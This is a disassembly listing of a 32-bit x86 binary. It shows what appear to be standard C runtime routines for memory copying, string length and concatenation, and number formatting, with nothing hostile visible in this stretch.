  4134be:	ff 74 24 0c          	push   0xc(%esp)
  4134c2:	ff 74 24 0c          	push   0xc(%esp)
  4134c6:	e8 96 fe ff ff       	call   0x413361
  4134cb:	83 c4 0c             	add    $0xc,%esp
  4134ce:	c3                   	ret
  4134cf:	68 f4 61 45 00       	push   $0x4561f4
  4134d4:	ff 74 24 0c          	push   0xc(%esp)
  4134d8:	ff 74 24 0c          	push   0xc(%esp)
  4134dc:	e8 80 fe ff ff       	call   0x413361
  4134e1:	83 c4 0c             	add    $0xc,%esp
  4134e4:	c3                   	ret
  4134e5:	55                   	push   %ebp
  4134e6:	8b ec                	mov    %esp,%ebp
  4134e8:	83 ec 14             	sub    $0x14,%esp
  4134eb:	a1 10 62 45 00       	mov    0x456210,%eax
  4134f0:	33 45 04             	xor    0x4(%ebp),%eax
  4134f3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4134f6:	33 c0                	xor    %eax,%eax
  4134f8:	50                   	push   %eax
  4134f9:	50                   	push   %eax
  4134fa:	50                   	push   %eax
  4134fb:	50                   	push   %eax
  4134fc:	ff 75 0c             	push   0xc(%ebp)
  4134ff:	8d 45 f8             	lea    -0x8(%ebp),%eax
  413502:	50                   	push   %eax
  413503:	8d 45 ec             	lea    -0x14(%ebp),%eax
  413506:	50                   	push   %eax
  413507:	e8 01 2b 00 00       	call   0x41600d
  41350c:	ff 75 08             	push   0x8(%ebp)
  41350f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  413512:	50                   	push   %eax
  413513:	e8 a1 ff ff ff       	call   0x4134b9
  413518:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41351b:	33 4d 04             	xor    0x4(%ebp),%ecx
  41351e:	83 c4 24             	add    $0x24,%esp
  413521:	e8 e6 06 00 00       	call   0x413c0c
  413526:	c9                   	leave
  413527:	c3                   	ret
  413528:	55                   	push   %ebp
  413529:	8b ec                	mov    %esp,%ebp
  41352b:	83 ec 14             	sub    $0x14,%esp
  41352e:	a1 10 62 45 00       	mov    0x456210,%eax
  413533:	33 45 04             	xor    0x4(%ebp),%eax
  413536:	89 45 fc             	mov    %eax,-0x4(%ebp)
  413539:	33 c0                	xor    %eax,%eax
  41353b:	50                   	push   %eax
  41353c:	50                   	push   %eax
  41353d:	50                   	push   %eax
  41353e:	50                   	push   %eax
  41353f:	ff 75 0c             	push   0xc(%ebp)
  413542:	8d 45 f8             	lea    -0x8(%ebp),%eax
  413545:	50                   	push   %eax
  413546:	8d 45 ec             	lea    -0x14(%ebp),%eax
  413549:	50                   	push   %eax
  41354a:	e8 be 2a 00 00       	call   0x41600d
  41354f:	ff 75 08             	push   0x8(%ebp)
  413552:	8d 45 ec             	lea    -0x14(%ebp),%eax
  413555:	50                   	push   %eax
  413556:	e8 74 ff ff ff       	call   0x4134cf
  41355b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41355e:	33 4d 04             	xor    0x4(%ebp),%ecx
  413561:	83 c4 24             	add    $0x24,%esp
  413564:	e8 a3 06 00 00       	call   0x413c0c
  413569:	c9                   	leave
  41356a:	c3                   	ret
  41356b:	cc                   	int3
  41356c:	cc                   	int3
  41356d:	cc                   	int3
  41356e:	cc                   	int3
  41356f:	cc                   	int3
  413570:	55                   	push   %ebp
  413571:	8b ec                	mov    %esp,%ebp
  413573:	57                   	push   %edi
  413574:	56                   	push   %esi
  413575:	8b 75 0c             	mov    0xc(%ebp),%esi
  413578:	8b 4d 10             	mov    0x10(%ebp),%ecx
  41357b:	8b 7d 08             	mov    0x8(%ebp),%edi
  41357e:	8b c1                	mov    %ecx,%eax
  413580:	8b d1                	mov    %ecx,%edx
  413582:	03 c6                	add    %esi,%eax
  413584:	3b fe                	cmp    %esi,%edi
  413586:	76 08                	jbe    0x413590
  413588:	3b f8                	cmp    %eax,%edi
  41358a:	0f 82 7c 01 00 00    	jb     0x41370c
  413590:	f7 c7 03 00 00 00    	test   $0x3,%edi
  413596:	75 14                	jne    0x4135ac
  413598:	c1 e9 02             	shr    $0x2,%ecx
  41359b:	83 e2 03             	and    $0x3,%edx
  41359e:	83 f9 08             	cmp    $0x8,%ecx
  4135a1:	72 29                	jb     0x4135cc
  4135a3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4135a5:	ff 24 95 bc 36 41 00 	jmp    *0x4136bc(,%edx,4)
  4135ac:	8b c7                	mov    %edi,%eax
  4135ae:	ba 03 00 00 00       	mov    $0x3,%edx
  4135b3:	83 e9 04             	sub    $0x4,%ecx
  4135b6:	72 0c                	jb     0x4135c4
  4135b8:	83 e0 03             	and    $0x3,%eax
  4135bb:	03 c8                	add    %eax,%ecx
  4135bd:	ff 24 85 d0 35 41 00 	jmp    *0x4135d0(,%eax,4)
  4135c4:	ff 24 8d cc 36 41 00 	jmp    *0x4136cc(,%ecx,4)
  4135cb:	90                   	nop
  4135cc:	ff 24 8d 50 36 41 00 	jmp    *0x413650(,%ecx,4)
  4135d3:	90                   	nop
  4135d4:	e0 35                	loopne 0x41360b
  4135d6:	41                   	inc    %ecx
  4135d7:	00 0c 36             	add    %cl,(%esi,%esi,1)
  4135da:	41                   	inc    %ecx
  4135db:	00 30                	add    %dh,(%eax)
  4135dd:	36 41                	ss inc %ecx
  4135df:	00 23                	add    %ah,(%ebx)
  4135e1:	d1 8a 06 88 07 8a    	rorl   -0x75f877fa(%edx)
  4135e7:	46                   	inc    %esi
  4135e8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4135ee:	02 c1                	add    %cl,%al
  4135f0:	e9 02 88 47 02       	jmp    0x288bdf7
  4135f5:	83 c6 03             	add    $0x3,%esi
  4135f8:	83 c7 03             	add    $0x3,%edi
  4135fb:	83 f9 08             	cmp    $0x8,%ecx
  4135fe:	72 cc                	jb     0x4135cc
  413600:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  413602:	ff 24 95 bc 36 41 00 	jmp    *0x4136bc(,%edx,4)
  413609:	8d 49 00             	lea    0x0(%ecx),%ecx
  41360c:	23 d1                	and    %ecx,%edx
  41360e:	8a 06                	mov    (%esi),%al
  413610:	88 07                	mov    %al,(%edi)
  413612:	8a 46 01             	mov    0x1(%esi),%al
  413615:	c1 e9 02             	shr    $0x2,%ecx
  413618:	88 47 01             	mov    %al,0x1(%edi)
  41361b:	83 c6 02             	add    $0x2,%esi
  41361e:	83 c7 02             	add    $0x2,%edi
  413621:	83 f9 08             	cmp    $0x8,%ecx
  413624:	72 a6                	jb     0x4135cc
  413626:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  413628:	ff 24 95 bc 36 41 00 	jmp    *0x4136bc(,%edx,4)
  41362f:	90                   	nop
  413630:	23 d1                	and    %ecx,%edx
  413632:	8a 06                	mov    (%esi),%al
  413634:	88 07                	mov    %al,(%edi)
  413636:	83 c6 01             	add    $0x1,%esi
  413639:	c1 e9 02             	shr    $0x2,%ecx
  41363c:	83 c7 01             	add    $0x1,%edi
  41363f:	83 f9 08             	cmp    $0x8,%ecx
  413642:	72 88                	jb     0x4135cc
  413644:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  413646:	ff 24 95 bc 36 41 00 	jmp    *0x4136bc(,%edx,4)
  41364d:	8d 49 00             	lea    0x0(%ecx),%ecx
  413650:	b3 36                	mov    $0x36,%bl
  413652:	41                   	inc    %ecx
  413653:	00 a0 36 41 00 98    	add    %ah,-0x67ffbeca(%eax)
  413659:	36 41                	ss inc %ecx
  41365b:	00 90 36 41 00 88    	add    %dl,-0x77ffbeca(%eax)
  413661:	36 41                	ss inc %ecx
  413663:	00 80 36 41 00 78    	add    %al,0x78004136(%eax)
  413669:	36 41                	ss inc %ecx
  41366b:	00 70 36             	add    %dh,0x36(%eax)
  41366e:	41                   	inc    %ecx
  41366f:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  413675:	44                   	inc    %esp
  413676:	8f                   	(bad)
  413677:	e4 8b                	in     $0x8b,%al
  413679:	44                   	inc    %esp
  41367a:	8e e8                	mov    %eax,%gs
  41367c:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  413680:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  413684:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  413688:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  41368c:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  413690:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  413694:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  413698:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  41369c:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  4136a0:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  4136a4:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  4136a8:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4136af:	03 f0                	add    %eax,%esi
  4136b1:	03 f8                	add    %eax,%edi
  4136b3:	ff 24 95 bc 36 41 00 	jmp    *0x4136bc(,%edx,4)
  4136ba:	8b ff                	mov    %edi,%edi
  4136bc:	cc                   	int3
  4136bd:	36 41                	ss inc %ecx
  4136bf:	00 d4                	add    %dl,%ah
  4136c1:	36 41                	ss inc %ecx
  4136c3:	00 e0                	add    %ah,%al
  4136c5:	36 41                	ss inc %ecx
  4136c7:	00 f4                	add    %dh,%ah
  4136c9:	36 41                	ss inc %ecx
  4136cb:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4136d1:	c9                   	leave
  4136d2:	c3                   	ret
  4136d3:	90                   	nop
  4136d4:	8a 06                	mov    (%esi),%al
  4136d6:	88 07                	mov    %al,(%edi)
  4136d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4136db:	5e                   	pop    %esi
  4136dc:	5f                   	pop    %edi
  4136dd:	c9                   	leave
  4136de:	c3                   	ret
  4136df:	90                   	nop
  4136e0:	8a 06                	mov    (%esi),%al
  4136e2:	88 07                	mov    %al,(%edi)
  4136e4:	8a 46 01             	mov    0x1(%esi),%al
  4136e7:	88 47 01             	mov    %al,0x1(%edi)
  4136ea:	8b 45 08             	mov    0x8(%ebp),%eax
  4136ed:	5e                   	pop    %esi
  4136ee:	5f                   	pop    %edi
  4136ef:	c9                   	leave
  4136f0:	c3                   	ret
  4136f1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4136f4:	8a 06                	mov    (%esi),%al
  4136f6:	88 07                	mov    %al,(%edi)
  4136f8:	8a 46 01             	mov    0x1(%esi),%al
  4136fb:	88 47 01             	mov    %al,0x1(%edi)
  4136fe:	8a 46 02             	mov    0x2(%esi),%al
  413701:	88 47 02             	mov    %al,0x2(%edi)
  413704:	8b 45 08             	mov    0x8(%ebp),%eax
  413707:	5e                   	pop    %esi
  413708:	5f                   	pop    %edi
  413709:	c9                   	leave
  41370a:	c3                   	ret
  41370b:	90                   	nop
  41370c:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  413710:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  413714:	f7 c7 03 00 00 00    	test   $0x3,%edi
  41371a:	75 24                	jne    0x413740
  41371c:	c1 e9 02             	shr    $0x2,%ecx
  41371f:	83 e2 03             	and    $0x3,%edx
  413722:	83 f9 08             	cmp    $0x8,%ecx
  413725:	72 0d                	jb     0x413734
  413727:	fd                   	std
  413728:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  41372a:	fc                   	cld
  41372b:	ff 24 95 58 38 41 00 	jmp    *0x413858(,%edx,4)
  413732:	8b ff                	mov    %edi,%edi
  413734:	f7 d9                	neg    %ecx
  413736:	ff 24 8d 08 38 41 00 	jmp    *0x413808(,%ecx,4)
  41373d:	8d 49 00             	lea    0x0(%ecx),%ecx
  413740:	8b c7                	mov    %edi,%eax
  413742:	ba 03 00 00 00       	mov    $0x3,%edx
  413747:	83 f9 04             	cmp    $0x4,%ecx
  41374a:	72 0c                	jb     0x413758
  41374c:	83 e0 03             	and    $0x3,%eax
  41374f:	2b c8                	sub    %eax,%ecx
  413751:	ff 24 85 5c 37 41 00 	jmp    *0x41375c(,%eax,4)
  413758:	ff 24 8d 58 38 41 00 	jmp    *0x413858(,%ecx,4)
  41375f:	90                   	nop
  413760:	6c                   	insb   (%dx),%es:(%edi)
  413761:	37                   	aaa
  413762:	41                   	inc    %ecx
  413763:	00 90 37 41 00 b8    	add    %dl,-0x47ffbec9(%eax)
  413769:	37                   	aaa
  41376a:	41                   	inc    %ecx
  41376b:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  413771:	88 47 03             	mov    %al,0x3(%edi)
  413774:	83 ee 01             	sub    $0x1,%esi
  413777:	c1 e9 02             	shr    $0x2,%ecx
  41377a:	83 ef 01             	sub    $0x1,%edi
  41377d:	83 f9 08             	cmp    $0x8,%ecx
  413780:	72 b2                	jb     0x413734
  413782:	fd                   	std
  413783:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  413785:	fc                   	cld
  413786:	ff 24 95 58 38 41 00 	jmp    *0x413858(,%edx,4)
  41378d:	8d 49 00             	lea    0x0(%ecx),%ecx
  413790:	8a 46 03             	mov    0x3(%esi),%al
  413793:	23 d1                	and    %ecx,%edx
  413795:	88 47 03             	mov    %al,0x3(%edi)
  413798:	8a 46 02             	mov    0x2(%esi),%al
  41379b:	c1 e9 02             	shr    $0x2,%ecx
  41379e:	88 47 02             	mov    %al,0x2(%edi)
  4137a1:	83 ee 02             	sub    $0x2,%esi
  4137a4:	83 ef 02             	sub    $0x2,%edi
  4137a7:	83 f9 08             	cmp    $0x8,%ecx
  4137aa:	72 88                	jb     0x413734
  4137ac:	fd                   	std
  4137ad:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4137af:	fc                   	cld
  4137b0:	ff 24 95 58 38 41 00 	jmp    *0x413858(,%edx,4)
  4137b7:	90                   	nop
  4137b8:	8a 46 03             	mov    0x3(%esi),%al
  4137bb:	23 d1                	and    %ecx,%edx
  4137bd:	88 47 03             	mov    %al,0x3(%edi)
  4137c0:	8a 46 02             	mov    0x2(%esi),%al
  4137c3:	88 47 02             	mov    %al,0x2(%edi)
  4137c6:	8a 46 01             	mov    0x1(%esi),%al
  4137c9:	c1 e9 02             	shr    $0x2,%ecx
  4137cc:	88 47 01             	mov    %al,0x1(%edi)
  4137cf:	83 ee 03             	sub    $0x3,%esi
  4137d2:	83 ef 03             	sub    $0x3,%edi
  4137d5:	83 f9 08             	cmp    $0x8,%ecx
  4137d8:	0f 82 56 ff ff ff    	jb     0x413734
  4137de:	fd                   	std
  4137df:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4137e1:	fc                   	cld
  4137e2:	ff 24 95 58 38 41 00 	jmp    *0x413858(,%edx,4)
  4137e9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4137ec:	0c 38                	or     $0x38,%al
  4137ee:	41                   	inc    %ecx
  4137ef:	00 14 38             	add    %dl,(%eax,%edi,1)
  4137f2:	41                   	inc    %ecx
  4137f3:	00 1c 38             	add    %bl,(%eax,%edi,1)
  4137f6:	41                   	inc    %ecx
  4137f7:	00 24 38             	add    %ah,(%eax,%edi,1)
  4137fa:	41                   	inc    %ecx
  4137fb:	00 2c 38             	add    %ch,(%eax,%edi,1)
  4137fe:	41                   	inc    %ecx
  4137ff:	00 34 38             	add    %dh,(%eax,%edi,1)
  413802:	41                   	inc    %ecx
  413803:	00 3c 38             	add    %bh,(%eax,%edi,1)
  413806:	41                   	inc    %ecx
  413807:	00 4f 38             	add    %cl,0x38(%edi)
  41380a:	41                   	inc    %ecx
  41380b:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  413811:	44                   	inc    %esp
  413812:	8f                   	(bad)
  413813:	1c 8b                	sbb    $0x8b,%al
  413815:	44                   	inc    %esp
  413816:	8e 18                	mov    (%eax),%ds
  413818:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  41381c:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  413820:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  413824:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  413828:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  41382c:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  413830:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  413834:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  413838:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  41383c:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  413840:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  413844:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  41384b:	03 f0                	add    %eax,%esi
  41384d:	03 f8                	add    %eax,%edi
  41384f:	ff 24 95 58 38 41 00 	jmp    *0x413858(,%edx,4)
  413856:	8b ff                	mov    %edi,%edi
  413858:	68 38 41 00 70       	push   $0x70004138
  41385d:	38 41 00             	cmp    %al,0x0(%ecx)
  413860:	80 38 41             	cmpb   $0x41,(%eax)
  413863:	00 94 38 41 00 8b 45 	add    %dl,0x458b0041(%eax,%edi,1)
  41386a:	08 5e 5f             	or     %bl,0x5f(%esi)
  41386d:	c9                   	leave
  41386e:	c3                   	ret
  41386f:	90                   	nop
  413870:	8a 46 03             	mov    0x3(%esi),%al
  413873:	88 47 03             	mov    %al,0x3(%edi)
  413876:	8b 45 08             	mov    0x8(%ebp),%eax
  413879:	5e                   	pop    %esi
  41387a:	5f                   	pop    %edi
  41387b:	c9                   	leave
  41387c:	c3                   	ret
  41387d:	8d 49 00             	lea    0x0(%ecx),%ecx
  413880:	8a 46 03             	mov    0x3(%esi),%al
  413883:	88 47 03             	mov    %al,0x3(%edi)
  413886:	8a 46 02             	mov    0x2(%esi),%al
  413889:	88 47 02             	mov    %al,0x2(%edi)
  41388c:	8b 45 08             	mov    0x8(%ebp),%eax
  41388f:	5e                   	pop    %esi
  413890:	5f                   	pop    %edi
  413891:	c9                   	leave
  413892:	c3                   	ret
  413893:	90                   	nop
  413894:	8a 46 03             	mov    0x3(%esi),%al
  413897:	88 47 03             	mov    %al,0x3(%edi)
  41389a:	8a 46 02             	mov    0x2(%esi),%al
  41389d:	88 47 02             	mov    %al,0x2(%edi)
  4138a0:	8a 46 01             	mov    0x1(%esi),%al
  4138a3:	88 47 01             	mov    %al,0x1(%edi)
  4138a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4138a9:	5e                   	pop    %esi
  4138aa:	5f                   	pop    %edi
  4138ab:	c9                   	leave
  4138ac:	c3                   	ret
  4138ad:	cc                   	int3
  4138ae:	cc                   	int3
  4138af:	cc                   	int3
  4138b0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4138b4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4138ba:	74 24                	je     0x4138e0
  4138bc:	8a 01                	mov    (%ecx),%al
  4138be:	83 c1 01             	add    $0x1,%ecx
  4138c1:	84 c0                	test   %al,%al
  4138c3:	74 4e                	je     0x413913
  4138c5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4138cb:	75 ef                	jne    0x4138bc
  4138cd:	05 00 00 00 00       	add    $0x0,%eax
  4138d2:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4138d9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4138e0:	8b 01                	mov    (%ecx),%eax
  4138e2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4138e7:	03 d0                	add    %eax,%edx
  4138e9:	83 f0 ff             	xor    $0xffffffff,%eax
  4138ec:	33 c2                	xor    %edx,%eax
  4138ee:	83 c1 04             	add    $0x4,%ecx
  4138f1:	a9 00 01 01 81       	test   $0x81010100,%eax
  4138f6:	74 e8                	je     0x4138e0
  4138f8:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4138fb:	84 c0                	test   %al,%al
  4138fd:	74 32                	je     0x413931
  4138ff:	84 e4                	test   %ah,%ah
  413901:	74 24                	je     0x413927
  413903:	a9 00 00 ff 00       	test   $0xff0000,%eax
  413908:	74 13                	je     0x41391d
  41390a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  41390f:	74 02                	je     0x413913
  413911:	eb cd                	jmp    0x4138e0
  413913:	8d 41 ff             	lea    -0x1(%ecx),%eax
  413916:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  41391a:	2b c1                	sub    %ecx,%eax
  41391c:	c3                   	ret
  41391d:	8d 41 fe             	lea    -0x2(%ecx),%eax
  413920:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  413924:	2b c1                	sub    %ecx,%eax
  413926:	c3                   	ret
  413927:	8d 41 fd             	lea    -0x3(%ecx),%eax
  41392a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  41392e:	2b c1                	sub    %ecx,%eax
  413930:	c3                   	ret
  413931:	8d 41 fc             	lea    -0x4(%ecx),%eax
  413934:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  413938:	2b c1                	sub    %ecx,%eax
  41393a:	c3                   	ret
  41393b:	cc                   	int3
  41393c:	cc                   	int3
  41393d:	cc                   	int3
  41393e:	cc                   	int3
  41393f:	cc                   	int3
  413940:	57                   	push   %edi
  413941:	8b 7c 24 08          	mov    0x8(%esp),%edi
  413945:	eb 6e                	jmp    0x4139b5
  413947:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  41394e:	8b ff                	mov    %edi,%edi
  413950:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  413954:	57                   	push   %edi
  413955:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  41395b:	74 13                	je     0x413970
  41395d:	8a 01                	mov    (%ecx),%al
  41395f:	83 c1 01             	add    $0x1,%ecx
  413962:	84 c0                	test   %al,%al
  413964:	74 3d                	je     0x4139a3
  413966:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  41396c:	75 ef                	jne    0x41395d
  41396e:	8b ff                	mov    %edi,%edi
  413970:	8b 01                	mov    (%ecx),%eax
  413972:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  413977:	03 d0                	add    %eax,%edx
  413979:	83 f0 ff             	xor    $0xffffffff,%eax
  41397c:	33 c2                	xor    %edx,%eax
  41397e:	83 c1 04             	add    $0x4,%ecx
  413981:	a9 00 01 01 81       	test   $0x81010100,%eax
  413986:	74 e8                	je     0x413970
  413988:	8b 41 fc             	mov    -0x4(%ecx),%eax
  41398b:	84 c0                	test   %al,%al
  41398d:	74 23                	je     0x4139b2
  41398f:	84 e4                	test   %ah,%ah
  413991:	74 1a                	je     0x4139ad
  413993:	a9 00 00 ff 00       	test   $0xff0000,%eax
  413998:	74 0e                	je     0x4139a8
  41399a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  41399f:	74 02                	je     0x4139a3
  4139a1:	eb cd                	jmp    0x413970
  4139a3:	8d 79 ff             	lea    -0x1(%ecx),%edi
  4139a6:	eb 0d                	jmp    0x4139b5
  4139a8:	8d 79 fe             	lea    -0x2(%ecx),%edi
  4139ab:	eb 08                	jmp    0x4139b5
  4139ad:	8d 79 fd             	lea    -0x3(%ecx),%edi
  4139b0:	eb 03                	jmp    0x4139b5
  4139b2:	8d 79 fc             	lea    -0x4(%ecx),%edi
  4139b5:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4139b9:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4139bf:	74 1d                	je     0x4139de
  4139c1:	8a 11                	mov    (%ecx),%dl
  4139c3:	83 c1 01             	add    $0x1,%ecx
  4139c6:	84 d2                	test   %dl,%dl
  4139c8:	74 66                	je     0x413a30
  4139ca:	88 17                	mov    %dl,(%edi)
  4139cc:	83 c7 01             	add    $0x1,%edi
  4139cf:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4139d5:	75 ea                	jne    0x4139c1
  4139d7:	eb 05                	jmp    0x4139de
  4139d9:	89 17                	mov    %edx,(%edi)
  4139db:	83 c7 04             	add    $0x4,%edi
  4139de:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4139e3:	8b 01                	mov    (%ecx),%eax
  4139e5:	03 d0                	add    %eax,%edx
  4139e7:	83 f0 ff             	xor    $0xffffffff,%eax
  4139ea:	33 c2                	xor    %edx,%eax
  4139ec:	8b 11                	mov    (%ecx),%edx
  4139ee:	83 c1 04             	add    $0x4,%ecx
  4139f1:	a9 00 01 01 81       	test   $0x81010100,%eax
  4139f6:	74 e1                	je     0x4139d9
  4139f8:	84 d2                	test   %dl,%dl
  4139fa:	74 34                	je     0x413a30
  4139fc:	84 f6                	test   %dh,%dh
  4139fe:	74 27                	je     0x413a27
  413a00:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  413a06:	74 12                	je     0x413a1a
  413a08:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  413a0e:	74 02                	je     0x413a12
  413a10:	eb c7                	jmp    0x4139d9
  413a12:	89 17                	mov    %edx,(%edi)
  413a14:	8b 44 24 08          	mov    0x8(%esp),%eax
  413a18:	5f                   	pop    %edi
  413a19:	c3                   	ret
  413a1a:	66 89 17             	mov    %dx,(%edi)
  413a1d:	8b 44 24 08          	mov    0x8(%esp),%eax
  413a21:	c6 47 02 00          	movb   $0x0,0x2(%edi)
  413a25:	5f                   	pop    %edi
  413a26:	c3                   	ret
  413a27:	66 89 17             	mov    %dx,(%edi)
  413a2a:	8b 44 24 08          	mov    0x8(%esp),%eax
  413a2e:	5f                   	pop    %edi
  413a2f:	c3                   	ret
  413a30:	88 17                	mov    %dl,(%edi)
  413a32:	8b 44 24 08          	mov    0x8(%esp),%eax
  413a36:	5f                   	pop    %edi
  413a37:	c3                   	ret
  413a38:	55                   	push   %ebp
  413a39:	8b ec                	mov    %esp,%ebp
  413a3b:	8b 55 10             	mov    0x10(%ebp),%edx
  413a3e:	8b 4a 0c             	mov    0xc(%edx),%ecx
  413a41:	53                   	push   %ebx
  413a42:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  413a45:	85 db                	test   %ebx,%ebx
  413a47:	56                   	push   %esi
  413a48:	8b 75 08             	mov    0x8(%ebp),%esi
  413a4b:	57                   	push   %edi
  413a4c:	8d 7e 01             	lea    0x1(%esi),%edi
  413a4f:	c6 06 30             	movb   $0x30,(%esi)
  413a52:	8b c7                	mov    %edi,%eax
  413a54:	7e 1f                	jle    0x413a75
  413a56:	89 5d 08             	mov    %ebx,0x8(%ebp)
  413a59:	33 db                	xor    %ebx,%ebx
  413a5b:	8a 11                	mov    (%ecx),%dl
  413a5d:	84 d2                	test   %dl,%dl
  413a5f:	74 06                	je     0x413a67
  413a61:	0f be d2             	movsbl %dl,%edx
  413a64:	41                   	inc    %ecx
  413a65:	eb 03                	jmp    0x413a6a
  413a67:	6a 30                	push   $0x30
  413a69:	5a                   	pop    %edx
  413a6a:	88 10                	mov    %dl,(%eax)
  413a6c:	40                   	inc    %eax
  413a6d:	ff 4d 08             	decl   0x8(%ebp)
  413a70:	75 e9                	jne    0x413a5b
  413a72:	8b 55 10             	mov    0x10(%ebp),%edx
  413a75:	80 20 00             	andb   $0x0,(%eax)
  413a78:	85 db                	test   %ebx,%ebx
  413a7a:	7c 12                	jl     0x413a8e
  413a7c:	80 39 35             	cmpb   $0x35,(%ecx)
  413a7f:	7c 0d                	jl     0x413a8e
  413a81:	eb 03                	jmp    0x413a86
  413a83:	c6 00 30             	movb   $0x30,(%eax)
  413a86:	48                   	dec    %eax
  413a87:	80 38 39             	cmpb   $0x39,(%eax)
  413a8a:	74 f7                	je     0x413a83
  413a8c:	fe 00                	incb   (%eax)
  413a8e:	80 3e 31             	cmpb   $0x31,(%esi)
  413a91:	75 05                	jne    0x413a98
  413a93:	ff 42 04             	incl   0x4(%edx)
  413a96:	eb 12                	jmp    0x413aaa
  413a98:	57                   	push   %edi
  413a99:	e8 12 fe ff ff       	call   0x4138b0
  413a9e:	40                   	inc    %eax
  413a9f:	50                   	push   %eax
  413aa0:	57                   	push   %edi
  413aa1:	56                   	push   %esi
  413aa2:	e8 c9 fa ff ff       	call   0x413570
  413aa7:	83 c4 10             	add    $0x10,%esp
  413aaa:	5f                   	pop    %edi
  413aab:	5e                   	pop    %esi
  413aac:	5b                   	pop    %ebx
  413aad:	5d                   	pop    %ebp
  413aae:	c3                   	ret
  413aaf:	55                   	push   %ebp
  413ab0:	8b ec                	mov    %esp,%ebp
  413ab2:	51                   	push   %ecx
  413ab3:	8b 55 0c             	mov    0xc(%ebp),%edx
  413ab6:	33 c0                	xor    %eax,%eax
  413ab8:	66 8b 42 06          	mov    0x6(%edx),%ax
  413abc:	53                   	push   %ebx
  413abd:	56                   	push   %esi
  413abe:	57                   	push   %edi
  413abf:	bf ff 07 00 00       	mov    $0x7ff,%edi
  413ac4:	be 00 00 00 80       	mov    $0x80000000,%esi
  413ac9:	89 75 fc             	mov    %esi,-0x4(%ebp)
  413acc:	8b c8                	mov    %eax,%ecx
  413ace:	c1 e9 04             	shr    $0x4,%ecx
  413ad1:	25 00 80 00 00       	and    $0x8000,%eax
  413ad6:	23 cf                	and    %edi,%ecx
  413ad8:	89 45 0c             	mov    %eax,0xc(%ebp)
  413adb:	8b 42 04             	mov    0x4(%edx),%eax
  413ade:	8b 12                	mov    (%edx),%edx
  413ae0:	0f b7 d9             	movzwl %cx,%ebx
  413ae3:	25 ff ff 0f 00       	and    $0xfffff,%eax
  413ae8:	85 db                	test   %ebx,%ebx
  413aea:	74 13                	je     0x413aff
